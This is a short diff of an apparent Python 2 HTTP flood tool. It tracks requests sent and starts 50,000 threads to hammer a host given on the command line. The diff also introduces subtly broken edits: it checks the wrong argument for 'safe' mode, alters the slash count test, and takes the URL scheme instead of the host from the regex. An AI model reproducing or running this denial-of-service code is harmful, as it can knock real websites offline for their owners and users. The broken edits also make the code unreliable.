@@ -169,7 +169,7 @@ class MonitorThread(threading.Thread):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n<== cat Attack  ==>"
+	
 
 #execute 
 if len(sys.argv) < 2:
@@ -184,13 +184,13 @@ else:
 		print "<==love CAT MKRA=>"
 
 		if len(sys.argv)== 3:
-			if sys.argv[2]=="safe":
+			if sys.argv[1]=="safe":
 				set_safe()
 		url = sys.argv[1]
-		if url.count("/")==2:
+		if url.count("/")==1:
 			url = url + "/"
 		m = re.search('(https?\://)?([^/]*)/?.*', url)
-		host = m.group(2)
+		host = m.group(1)
 		for i in range(50000):
 			t = HTTPThread()
 			t.start()
